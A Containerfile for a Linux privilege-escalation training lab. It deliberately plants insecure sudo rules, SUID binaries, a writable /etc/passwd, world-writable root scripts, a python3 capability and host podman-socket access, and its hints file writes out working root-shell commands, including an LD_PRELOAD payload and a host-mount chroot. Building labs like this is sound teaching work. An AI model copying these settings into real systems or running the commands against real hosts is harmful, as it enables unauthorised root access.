# privilege-escalation.Containerfile
# Linux Privilege Escalation Lab
#
# Simulates a compromised Linux host with multiple intentional
# privilege escalation vectors. The student logs in as a
# low-privileged user and must escalate to root.
#
# Build:
#   podman build -t privilege-escalation -f privilege-escalation.Containerfile .
#
# Run:
#   podman run -it --rm --hostname compromised-web \
#       -v /run/podman/podman.sock:/run/podman/podman.sock:Z \
#       --name pwnbox privilege-escalation
#
# Login credentials:
#   Username: student
#   Password: student
#
# Goal: Reach root (UID 0) using any of the planted vectors.
#
# ────────────────────────────────────────────────────────────

FROM docker.io/alpine:latest

# ── System packages ──
RUN apk add --no-cache \
    bash \
    sudo \
    shadow \
    vim \
    findutils \
    python3 \
    py3-pip \
    curl \
    wget \
    netcat-openbsd \
    openssh \
    procps \
    util-linux \
    coreutils \
    gawk \
    perl \
    ruby \
    nodejs \
    npm \
    grep \
    sed \
    tar \
    gzip \
    podman \
    tmux \
    git \
    gcc \
    musl-dev \
    make \
    libcap \
    man-pages

# ── Create student user ──
RUN adduser -D student -s /bin/bash \
    && echo 'student:student' | chpasswd

# ── Add student to podman group ──
RUN addgroup podman && addgroup student podman

# ── Configure sudoers — multiple misconfigurations ──
RUN echo 'student ALL=(root) NOPASSWD: /usr/bin/vim' >> /etc/sudoers \
    && echo 'student ALL=(root) NOPASSWD: /usr/bin/find' >> /etc/sudoers \
    && echo 'student ALL=(root) NOPASSWD: /usr/bin/python3 /opt/backup.py' >> /etc/sudoers \
    && echo 'student ALL=(root) NOPASSWD: /bin/tar' >> /etc/sudoers \
    && echo 'Defaults env_keep += "LD_PRELOAD"' >> /etc/sudoers \
    && echo 'Defaults env_keep += "PYTHONPATH"' >> /etc/sudoers

# ── SUID binaries ──
RUN chmod u+s /usr/bin/find \
    && chmod u+s /usr/bin/awk \
    && chmod u+s /usr/bin/perl

# ── Capabilities misconfiguration ──
# Give Python the ability to read any file (CAP_DAC_READ_SEARCH)
RUN setcap cap_dac_read_search+ep /usr/bin/python3

# ── Writable cron job ──
RUN echo '*/5 * * * * root /opt/scripts/cleanup.sh' >> /etc/crontabs/root \
    && mkdir -p /opt/scripts \
    && echo '#!/bin/bash' > /opt/scripts/cleanup.sh \
    && echo '# Cleanup temporary files (runs every 5 min)' >> /opt/scripts/cleanup.sh \
    && echo 'find /tmp -type f -name "*.tmp" -mmin +10 -delete 2>/dev/null' >> /opt/scripts/cleanup.sh \
    && chmod 777 /opt/scripts/cleanup.sh

# ── Writable systemd service (simulated) ──
# In a container, systemd is not directly used, but we create the vector
# so students can identify it. We simulate with a crontab entry that
# runs a writable "service" script.
RUN mkdir -p /etc/systemd/system \
    && echo '[Unit]' > /etc/systemd/system/monitor.service \
    && echo 'Description=System Monitor Service' >> /etc/systemd/system/monitor.service \
    && echo '[Service]' >> /etc/systemd/system/monitor.service \
    && echo 'Type=simple' >> /etc/systemd/system/monitor.service \
    && echo 'ExecStart=/opt/monitor/agent.sh' >> /etc/systemd/system/monitor.service \
    && echo 'Restart=no' >> /etc/systemd/system/monitor.service \
    && mkdir -p /opt/monitor \
    && chmod 777 /opt/monitor

# ── Writable passwd ──
RUN chmod 646 /etc/passwd

# ── Readable shadow ──
RUN chmod 644 /etc/shadow

# ── Vulnerable sudo version (simulated) ──
# In a lab, using Alpine's sudo version. For Baron Samedit practice,
# students should check the version and attempt the exploit.
# Alpine ships a patched sudo; this vector is informational.

# ── NFS simulation ──
# Create a directory that simulates an NFS mount with no_root_squash
RUN mkdir -p /mnt/nfs_share && echo 'simulated nfs share' > /mnt/nfs_share/README.txt

# ── Environment variable with "secret" ──
RUN echo 'export DB_PASSWORD=SuperSecretP@ssw0rd2026' >> /home/student/.bashrc \
    && echo 'export API_KEY=sk-a1b2c3d4e5f6g7h8i9j0klmnopqrstuv' >> /home/student/.bashrc

# ── SSH key (fake but identifiable) ──
RUN mkdir -p /home/student/.ssh \
    && ssh-keygen -t rsa -b 2048 -f /home/student/.ssh/id_rsa -N "" -C "student@compromised-web" \
    && chown -R student:student /home/student/.ssh

# ── Bash history with "interesting" commands ──
RUN echo 'mysql -u root -pSuperSecretP@ssw0rd2026 -h db-internal' >> /home/student/.bash_history \
    && echo 'ssh admin@10.10.10.50' >> /home/student/.bash_history \
    && echo 'sudo /usr/bin/vim /var/www/html/index.html' >> /home/student/.bash_history \
    && echo 'cat /etc/shadow' >> /home/student/.bash_history \
    && chown student:student /home/student/.bash_history

# ── Writable Python backup script (sudo target) ──
RUN echo '#!/usr/bin/env python3' > /opt/backup.py \
    && echo '# Backup script — runs as root via sudo' >> /opt/backup.py \
    && echo 'import os' >> /opt/backup.py \
    && echo 'import sys' >> /opt/backup.py \
    && echo '' >> /opt/backup.py \
    && echo 'def main():' >> /opt/backup.py \
    && echo '    print("[*] Running backup...")' >> /opt/backup.py \
    && echo '    backup_dir = "/var/backups"' >> /opt/backup.py \
    && echo '    os.makedirs(backup_dir, exist_ok=True)' >> /opt/backup.py \
    && echo '    print(f"[+] Backup complete to {backup_dir}")' >> /opt/backup.py \
    && echo '' >> /opt/backup.py \
    && echo 'if __name__ == "__main__":' >> /opt/backup.py \
    && echo '    main()' >> /opt/backup.py \
    && chmod 777 /opt/backup.py

# ── Podman socket (mounted at runtime) ──
# When running the container, mount the host podman socket:
#   -v /run/podman/podman.sock:/run/podman/podman.sock:Z

# ── Writable rc.local (simulated, since Alpine doesn't use it) ──
RUN mkdir -p /etc/init.d \
    && echo '#!/bin/bash' > /etc/init.d/local \
    && echo '# /etc/init.d/local — runs at startup' >> /etc/init.d/local \
    && chmod 777 /etc/init.d/local

# ── Set up the student's home with a README ──
RUN mkdir -p /home/student

RUN printf '%s\n' \
    '╔══════════════════════════════════════════════════════════════╗' \
    '║                PRIVILEGE ESCALATION LAB                       ║' \
    '╠══════════════════════════════════════════════════════════════╣' \
    '║                                                              ║' \
    '║  You are logged in as: student                               ║' \
    '║                                                        ' \
    '║  Your goal: Escalate to root (UID 0).                        ║' \
    '║                                                        ' \
    '║  The system contains multiple intentional vulnerabilities:   ║' \
    '║                                                        ' \
    '║  1. SUID binaries (find, awk, perl)                          ║' \
    '║  2. Sudo misconfigurations with shell-escape binaries        ║' \
    '║  3. Writable /etc/passwd                                     ║' \
    '║  4. Readable /etc/shadow                                     ║' \
    '║  5. Writable cron job: /opt/scripts/cleanup.sh               ║' \
    '║  6. Writable systemd service path: /opt/monitor/             ║' \
    '║  7. Writable Python backup script run via sudo               ║' \
    '║  8. CAP_DAC_READ_SEARCH capability on python3                ║' \
    '║  9. LD_PRELOAD preserved in sudo environment                 ║' \
    '║  10. Podman socket access (podman group)                      ║' \
    '║  11. Credentials in .bash_history and environment            ║' \
    '║                                                        ' \
    '║  Start with: id && sudo -l && find / -perm -4000 2>/dev/null ║' \
    '║                                                        ' \
    '║  HINT: Check /home/student/vectors.txt for detailed hints.   ║' \
    '║                                                        ' \
    '╚══════════════════════════════════════════════════════════════╝' \
    > /home/student/README.txt

# ── Detailed hints file (students can read after trying) ──
RUN printf '%s\n' \
    '═══ Privilege Escalation Vectors — Detailed Hints ═══' \
    '' \
    'Vector 1 — SUID find:' \
    '  find . -exec /bin/sh -p \; -quit' \
    '  GTFOBins: https://gtfobins.github.io/gtfobins/find/' \
    '' \
    'Vector 2 — SUID awk:' \
    '  awk "BEGIN {system(\\"/bin/sh -p\\")}"' \
    '' \
    'Vector 3 — SUID perl:' \
    '  perl -e "exec \\"/bin/sh -p\\";"' \
    '' \
    'Vector 4 — Sudo vim:' \
    '  sudo vim -c ":!/bin/bash"' \
    '' \
    'Vector 5 — Sudo find:' \
    '  sudo find . -exec /bin/bash \\;' \
    '' \
    'Vector 6 — Sudo tar:' \
    '  sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash' \
    '' \
    'Vector 7 — Writable /etc/passwd:' \
    '  echo "evil::0:0:root:/root:/bin/bash" >> /etc/passwd' \
    '  su evil' \
    '' \
    'Vector 8 — Writable cron job:' \
    '  echo "#!/bin/bash" > /opt/scripts/cleanup.sh' \
    '  echo "cp /bin/bash /tmp/shell && chmod u+s /tmp/shell" >> /opt/scripts/cleanup.sh' \
    '  # Wait up to 5 minutes for cron to execute' \
    '  /tmp/shell -p' \
    '' \
    'Vector 9 — Writable systemd path:' \
    '  echo "#!/bin/bash" > /opt/monitor/agent.sh' \
    '  echo "cp /bin/bash /tmp/shell && chmod u+s /tmp/shell" >> /opt/monitor/agent.sh' \
    '  chmod +x /opt/monitor/agent.sh' \
    '' \
    'Vector 10 — Writable sudo Python script:' \
    '  echo "import os; os.system(\\"cp /bin/bash /tmp/shell && chmod u+s /tmp/shell\\")" > /opt/backup.py' \
    '  sudo /usr/bin/python3 /opt/backup.py' \
    '  /tmp/shell -p' \
    '' \
    'Vector 11 — CAP_DAC_READ_SEARCH (read /etc/shadow):' \
    '  python3 -c "print(open(\\"/etc/shadow\\").read())"' \
    '  # Extract root hash and crack with john/hashcat' \
    '' \
    'Vector 12 — LD_PRELOAD with sudo:' \
    '  # Create a shared library payload' \
    '  cat > /tmp/evil.c << "CEOF"' \
    '  #include <stdio.h>' \
    '  #include <sys/types.h>' \
    '  #include <stdlib.h>' \
    '  void _init() {' \
    '      unsetenv("LD_PRELOAD");' \
    '      setgid(0); setuid(0);' \
    '      system("/bin/bash -p");' \
    '  }' \
    '  CEOF' \
    '  gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c' \
    '  sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find' \
    '' \
    'Vector 13 — Container runtime group (requires -v /run/podman/podman.sock):' \
    '  podman run -it --rm -v /:/mnt/host alpine chroot /mnt/host /bin/bash' \
    '' \
    'Vector 14 — Environment credentials (lateral movement):' \
    '  env | grep -i pass' \
    '  env | grep -i key' \
    '  cat ~/.bash_history' \
    '' \
    '═══ End of hints ═══' \
    > /home/student/vectors.txt

RUN chown -R student:student /home/student

# ── Startup banner ──
RUN printf '%s\n' \
    '' \
    ' ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗' \
    ' ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝' \
    ' ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║' \
    ' ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║' \
    ' ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗' \
    ' ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝' \
    '' \
    '        ┌─── Privilege Escalation Lab ───┐' \
    '        │  User: student                 │' \
    '        │  Goal: root                    │' \
    '        │  Hints: /home/student/vectors.txt │' \
    '        └────────────────────────────────┘' \
    '' \
    > /etc/motd

RUN chown student:student /home/student/README.txt /home/student/vectors.txt

# ── Default to student user ──
USER student
WORKDIR /home/student
CMD ["/bin/bash"]
